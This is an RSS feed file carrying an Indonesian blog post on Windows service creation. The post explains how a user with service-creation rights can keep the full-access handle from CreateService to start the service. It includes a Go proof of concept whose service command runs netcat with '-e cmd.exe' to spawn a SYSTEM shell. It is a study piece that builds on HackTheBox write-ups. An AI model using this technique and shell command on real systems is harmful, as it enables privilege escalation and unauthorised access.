@@ -1,0 +1,265 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Windows Internal on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/threads/windows-internal/</link>
+    <description>Recent content in Windows Internal on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Thu, 12 Aug 2021 22:04:18 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/threads/windows-internal/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Start a Windows Service During Its Creation</title>
+      <link>https://fahmifj.github.io/blog/20210812_start-a-windows-service-during-its-creation/</link>
+      <pubDate>Thu, 12 Aug 2021 22:04:18 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/blog/20210812_start-a-windows-service-during-its-creation/</guid>
+      <description>Eksplorasi Windows Service</description>
+      <content:encoded><![CDATA[<p>Tahun lalu (ternyata udah setahun), gw sempat baca dua buah postingan blog yang membahas tentang Windows Service. Postingan pertama adalah &ldquo;beyond root&rdquo; dari mesin Resolute HackTheBox yang ditulis oleh <a href="https://twitter.com/0xdf_"target="_blank" rel="noopener noreferrer"
+>0xdf</a> dan yang kedua adalah postingan yang ditulis oleh <a href="https://twitter.com/VbScrub"target="_blank" rel="noopener noreferrer"
+>VbScrub</a>. Kedua postingan tersebut dapat dibaca ditautan berikut:</p>
+<ul>
+<li>
+<p><a href="https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html"target="_blank" rel="noopener noreferrer"
+>https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></p>
+</li>
+<li>
+<p><a href="https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/"target="_blank" rel="noopener noreferrer"
+>https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></p>
+</li>
+</ul>
+<p>Di postingan pertama, 0xdf lebih membahas tentang <code>psexec</code>-nya Impacket dan tool serupa lainnya, sedangkan di postingan kedua, VbScrub melanjutkan <em>kulikan<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>nya</em>-nya 0xdf dan lebih membahas tentang Windows service-nya.</p>
+<p>Berkat kedua postingan tersebut, saya jadi tertarik juga untuk ikut ngulik dan nyelam ke dokumentasi API Windows service.</p>
+<p>Sekilas definisi, sederhananya service adalah suatu program yang berjalan di belakang layar. Untuk Linux/Unix-like, biasanya disebut Daemon.</p>
+<p><div class="img-container"><img src="imgs/image-20210812024145951.png" alt="image-20210812024145951"  /></div>
+</p>
+<div class="force-center"><small> Sumber colongan tertera </small></div>
+<h2 id="creation-of-a-service">Creation of a Service</h2>
+<p>Pada Windows, sebuah service dapat dibuat dengan menggunakan command-line utility bawaan Windows bernama <code>sc.exe</code>. Berikut contoh penggunaannya.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span> sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\program.exe&#34;</span></span></span></code></pre>
+</figure><ul>
+<li>MyService = Nama service</li>
+<li>binPath = Lokasi executable program (+ argument)</li>
+</ul>
+<p>Kedua argumen diatas wajib disuplai (minimal).</p>
+<p>Pembuatan service <code>MyService</code> akan berhasil jika perintah di atas dieksekusi pada elevated terminal (akses admin), atau user yang menjalankannya memiliki hak membuat service (<code>SC_MANAGER_CREATE_SERVICE</code>).</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS</span></span></code></pre>
+</figure><p>Jika bukan elevated atau tanpa hak untuk membuat service, maka hasil yang diberikan oleh <code>sc.exe</code> adalah pesan galat &ldquo;Access is denied&rdquo;.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc.exe create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> OpenSCManager FAILED 5:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Access is denied.</span></span></code></pre>
+</figure><p>Untuk mengetahui tahap pembuatan/instalasi sebuah service, kita bisa mengacu pada contoh kode bahasa C dari <a href="https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service"target="_blank" rel="noopener noreferrer"
+>dokumentasi Microsoft</a> berikut.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">VOID</span> <span class="nf">SvcInstall</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SC_HANDLE</span> <span class="n">schSCManager</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SC_HANDLE</span> <span class="n">schService</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">TCHAR</span> <span class="n">szPath</span><span class="p">[</span><span class="n">MAX_PATH</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nf">GetModuleFileName</span><span class="p">(</span> <span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">szPath</span><span class="p">,</span> <span class="n">MAX_PATH</span> <span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Cannot install service (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">     <span class="c1">// Creation of a Service: STEP 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Get a handle to the SCM database.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">schSCManager</span> <span class="o">=</span> <span class="nf">OpenSCManager</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// local computer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                    <span class="c1">// ServicesActive database
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SC_MANAGER_ALL_ACCESS</span><span class="p">);</span>  <span class="c1">// full access rights
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nb">NULL</span> <span class="o">==</span> <span class="n">schSCManager</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;OpenSCManager failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">     <span class="c1">// Creation of a Service: STEP 2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Create the service
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">schService</span> <span class="o">=</span> <span class="nf">CreateService</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">schSCManager</span><span class="p">,</span>              <span class="c1">// SCM database
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// name of service
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SVCNAME</span><span class="p">,</span>                   <span class="c1">// service name to display
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">szPath</span><span class="p">,</span>                    <span class="c1">// path to service&#39;s binary
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no load ordering group
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no tag identifier
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// no dependencies
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">,</span>                      <span class="c1">// LocalSystem account
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nb">NULL</span><span class="p">);</span>                     <span class="c1">// no password
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">schService</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;CreateService failed (%d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Service installed successfully</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Creation of a Service: STEP 3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="n">schService</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="n">schSCManager</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>Secara garis besar, tahap pembuatan service adalah seperti berikut:</p>
+<ol>
+<li>Program membuat koneksi ke Service Control Manager (SCM) dengan memanggil fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw"target="_blank" rel="noopener noreferrer"
+>OpenSCManager</a>. Fungsi ini mempunyai nilai kembali yang disebut <strong>handle</strong> (selanjutnya disebut <a href="https://docs.microsoft.com/en-us/windows/win32/services/scm-handles"target="_blank" rel="noopener noreferrer"
+>handle SCM</a>). Handle SCM ini memegang level akses tertentu terhadap SCM, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-the-service-control-manager"target="_blank" rel="noopener noreferrer"
+>disini</a>.</li>
+<li>Handle SCM bersama dengan argumen lainnya yang disuplai seperti &ldquo;nama service&rdquo; dan &ldquo;binPath&rdquo; akan di-passing ke fungsi  <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew"target="_blank" rel="noopener noreferrer"
+>CreateService()</a> untuk membuat service. Fungsi <code>CreateService()</code> juga mempunyai nilai kembali berupa <strong>handle</strong> (kita sebut handle SVC) dengan level akses tertentu terhadap si service tersebut, detailnya bisa dilihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?redirectedfrom=MSDN#access-rights-for-a-service"target="_blank" rel="noopener noreferrer"
+>disini</a>.</li>
+<li>Di tahap ini, pesan sukses ditampilkan kemudian handle SCM dan handle SVC <u>ditutup</u> dan program keluar.</li>
+</ol>
+<blockquote>
+<ul>
+<li>SCM sederhananya dapat dianggap sebagai database dari service.</li>
+<li>Handle SCM menentukan apakah kita dapat melakukan read/write access pada SCM dan handle SVC menentukan apakah kita dapat mengontrol suatu service. Didapatkannya handle SVC sendiri bergantung pada level akses handle SCM.</li>
+</ul>
+</blockquote>
+<p>Pada potongan kode sebelumnya akses handle SCM adalah <code>SC_MANAGER_ALL_ACCESS</code>, maka pemberian hak ases ini memerlukan <em>elevated process</em> (admin). Jadi bisa dibenarkan pembuatan service memerlukan akses admin.  Sedangkan kasus mesin Resolute yang diulas oleh 0xdf, handle SCM dengan akses <code>SC_MANAGER_CREATE_SERVICE</code> pun sudah cukup untuk membuat service.</p>
+<h2 id="starting-a-service">Starting a Service</h2>
+<p>Masih dengan tool yang sama (<code>sc.exe</code>), sebuah service dapat di jalankan dengan perintah berikut.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\&gt;</span>sc start MyService</span></span></code></pre>
+</figure><p>Normalnya, service yang berhasil dibuat oleh user menggunakan <code>sc.exe</code> dalam mode elevated atau user dengan hak <code>SC_MANAGER_CREATE_SERVICE</code> tidak akan bisa dikontrol (start, stop) oleh <u>regular user</u>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create MyService <span class="nv">binPath</span><span class="o">=</span><span class="s2">&#34;C:\myservice\nc.exe&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> CreateService SUCCESS
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc start MyService
+</span></span><span class="line"><span class="cl"><span class="o">[</span>SC<span class="o">]</span> StartService: OpenService FAILED 5:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Access is denied.</span></span></code></pre>
+</figure><p>Pada contoh diatas, pembuatan service berhasil karena user <code>fahmi</code> memiliki hak <code>SC_MANAGER_CREATE_SERVICE</code>, tetapi tidak memiliki kontrol atas service yang dibuatnya.</p>
+<p>Jika melihat <a href="https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service"target="_blank" rel="noopener noreferrer"
+>dokumentasi</a> Microsoft, yang juga dalam bahasa C, tahapan menjalankan sebuah service tanpa <code>sc.exe</code> secara garis besarnya adalah seperti berikut:</p>
+<ol>
+<li>Membuat koneksi ke SCM database dan mendapatkan handle SCM dengan level akses tertentu</li>
+<li>Handle SCM kemudian di-passing ke fungsi <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openservicew"target="_blank" rel="noopener noreferrer"
+>OpenService()</a>. Fungsi ini mengembalikan handle SVC dengan level akses tertentu.</li>
+<li>Handle SVC yang didapat dipassing ke <a href="https://docs.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew"target="_blank" rel="noopener noreferrer"
+>StartService</a> untuk mulai menjalankan service.</li>
+</ol>
+<p>Dari ketiga tahap menjalankan service tersebut, regular user tentunya akan mendapat galat berupa &ldquo;Access is denied&rdquo; di tahap 2 karena handle SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.</p>
+<h2 id="dont-close-the-handles">Don&rsquo;t Close the Handles!</h2>
+<p>Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi <code>CreateSevice()</code> dipanggil, ternyata si pembuat  service (level admin atau user dengan hak  <code>SC_MANAGER_CREATE_SERVICE</code>) bisa <strong>menentukan level akses dirinya terhadap service yang dibuat</strong> dan handle SVC yang dikembalikan oleh fungsi tersebut akan memiliki level akses yang sama.</p>
+<p>Jadi, jika saat pembuatan service A, level akses yang disuplai adalah <code>SERVICE_ALL_ACCESS</code> (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A. Sayangnya handle SVC A ini ditutup berbarengan dengan handle SCM (tahap 3 pembuatan service).</p>
+<p>Lalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi <code>StartService</code>? Hal inilah yang ditemukan oleh 0xdf dan VbScrub!</p>
+<p>Untuk mencoba hal tersebut tentunya kita perlu membuat custom program terlebih dahulu dan berikut adalah program yang saya tulis dalam bahasa Go (Programnya versi argumen, bisa di cek <a href="https://github.com/fahmifj/winapi-go"target="_blank" rel="noopener noreferrer"
+>disini</a>).</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nx">main</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;golang.org/x/sys/windows&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">func</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="c1">// Creation of a Service: STEP 1
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Connect to scm to get a handle to create a service
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">scmHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">OpenSCManager</span><span class="p">(</span><span class="kc">nil</span><span class="p">,</span> <span class="kc">nil</span><span class="p">,</span> <span class="nx">windows</span><span class="p">.</span><span class="nx">SC_MANAGER_CREATE_SERVICE</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error cannot create a service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// define service
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">serviceName</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">&#34;MyService&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">serviceExecPath</span><span class="p">,</span> <span class="nx">_</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">UTF16PtrFromString</span><span class="p">(</span><span class="s">`C:\myservice\nc.exe -e cmd.exe localhost 9000`</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Creation of a ervice: STEP 2
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Create a service
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">svcHandle</span><span class="p">,</span> <span class="nx">err</span> <span class="o">:=</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">CreateService</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">scmHandle</span><span class="p">,</span>                         <span class="c1">// SCM database
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">serviceName</span><span class="p">,</span>                       <span class="c1">// name of service
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// service name to display
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ALL_ACCESS</span><span class="p">,</span>        <span class="c1">// desired access
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_WIN32_OWN_PROCESS</span><span class="p">,</span> <span class="c1">// service type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_DEMAND_START</span><span class="p">,</span>      <span class="c1">// start type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">windows</span><span class="p">.</span><span class="nx">SERVICE_ERROR_NORMAL</span><span class="p">,</span>      <span class="c1">// error control type
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nx">serviceExecPath</span><span class="p">,</span>                   <span class="c1">// path to service&#39;s binary
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no load ordering group
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no tag identifier
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no dependencies
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// LocalSystem account
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="kc">nil</span><span class="p">,</span>                               <span class="c1">// no password
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;err&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1">// Creation of a Service: STEP 3
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="c1">// Don&#39;t close the svcHandle, instead send it to StartService
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">if</span> <span class="nx">windows</span><span class="p">.</span><span class="nf">StartService</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="kc">nil</span><span class="p">);</span> <span class="nx">err</span> <span class="o">!=</span> <span class="kc">nil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">fmt</span><span class="p">.</span><span class="nf">Print</span><span class="p">(</span><span class="s">&#34;Error Starting service&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">os</span><span class="p">.</span><span class="nf">Exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Creation of a Service: STEP 4
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="c1">// Finally close the handles
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseServiceHandle</span><span class="p">(</span><span class="nx">svcHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">windows</span><span class="p">.</span><span class="nf">CloseHandle</span><span class="p">(</span><span class="nx">scmHandle</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>VbScrub sendiri sebelumnya telah menuliskan kode untuk mendemonstrasikan hal ini, bisa dilihat <a href="https://github.com/VbScrub/ServiceInstallerTest"target="_blank" rel="noopener noreferrer"
+>disini</a>.</p>
+<p><em>Hasilnya</em>?</p>
+<p>SYSTEM!*</p>
+<p><div class="img-container"><img src="imgs/image-20210813011334034.png" alt="image-20210813011334034"  /></div>
+</p>
+<blockquote>
+<p>*Perlu diingat user yang menjalankan program sudah perlu hak akses <code>SC_MANAGER_CREATE_SERVICE</code>.</p>
+</blockquote>
+<p><em>Tapi, kenapa harus custom code?</em></p>
+<p>Karena <code>sc.exe</code> sendiri tidak menyediakan opsi untuk meng-assign <code>SERVICE_ALL_ACCESS</code> pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">C:<span class="se">\U</span>sers<span class="se">\f</span>ahmi&gt;sc create
+</span></span><span class="line"><span class="cl">DESCRIPTION:
+</span></span><span class="line"><span class="cl">        Creates a service entry in the registry and Service Database.
+</span></span><span class="line"><span class="cl">USAGE:
+</span></span><span class="line"><span class="cl">        sc &lt;server&gt; create <span class="o">[</span>service name<span class="o">]</span> <span class="o">[</span><span class="nv">binPath</span><span class="o">=</span> <span class="o">]</span> &lt;option1&gt; &lt;option2&gt;...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">OPTIONS:
+</span></span><span class="line"><span class="cl">NOTE: The option name includes the equal sign.
+</span></span><span class="line"><span class="cl">      A space is required between the equal sign and the value.
+</span></span><span class="line"><span class="cl"> <span class="nv">type</span><span class="o">=</span> &lt;own<span class="p">|</span>share<span class="p">|</span>interact<span class="p">|</span>kernel<span class="p">|</span>filesys<span class="p">|</span>rec<span class="p">|</span>userown<span class="p">|</span>usershare&gt;
+</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> own<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">start</span><span class="o">=</span> &lt;boot<span class="p">|</span>system<span class="p">|</span>auto<span class="p">|</span>demand<span class="p">|</span>disabled<span class="p">|</span>delayed-auto&gt;
+</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> demand<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">error</span><span class="o">=</span> &lt;normal<span class="p">|</span>severe<span class="p">|</span>critical<span class="p">|</span>ignore&gt;
+</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> normal<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">binPath</span><span class="o">=</span> &lt;BinaryPathName to the .exe file&gt;
+</span></span><span class="line"><span class="cl"> <span class="nv">group</span><span class="o">=</span> &lt;LoadOrderGroup&gt;
+</span></span><span class="line"><span class="cl"> <span class="nv">tag</span><span class="o">=</span> &lt;yes<span class="p">|</span>no&gt;
+</span></span><span class="line"><span class="cl"> <span class="nv">depend</span><span class="o">=</span> &lt;Dependencies<span class="o">(</span>separated by / <span class="o">(</span>forward slash<span class="o">))</span>&gt;
+</span></span><span class="line"><span class="cl"> <span class="nv">obj</span><span class="o">=</span> &lt;AccountName<span class="p">|</span>ObjectName&gt;
+</span></span><span class="line"><span class="cl">       <span class="o">(</span><span class="nv">default</span> <span class="o">=</span> LocalSystem<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> <span class="nv">DisplayName</span><span class="o">=</span> &lt;display name&gt;
+</span></span><span class="line"><span class="cl"> <span class="nv">password</span><span class="o">=</span> &lt;password&gt;</span></span></code></pre>
+</figure><h2 id="conclusion">Conclusion</h2>
+<p>Disini kita tahu bahwa regular user dengan hak pembuatan service (<code>SC_MANAGER_CREATE_SERVICE</code>)  dapat membuat sebuah service tapi tidak memiliki kontrol langsung untuk menjalankan service tersebut. Tapi hal tersebut berbeda ceritanya jika handle yang didapatkan dari pembuatan sebuah service tersebut langsung digunakan untuk melakukan kontrol terhadap service yang dibuat.</p>
+<h4 id="jadi-intinya-ini-security-issue-atau-bukan">Jadi intinya ini <em>security issue</em> atau bukan?</h4>
+<p>Kalau mengacu ke <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?"target="_blank" rel="noopener noreferrer"
+>dokumentasi Microsoft</a>, bisa disimpulkan secara tidak langsung jika user yang mampu membuat service adalah termasuk admin. Sehingga ini bisa masuk <em>security issue</em> dibagian abuse privilege (user management) mungkin ya.</p>
+<p><div class="img-container"><img src="imgs/image-20210812194031337.png" alt="image-20210812194031337"  /></div>
+</p>
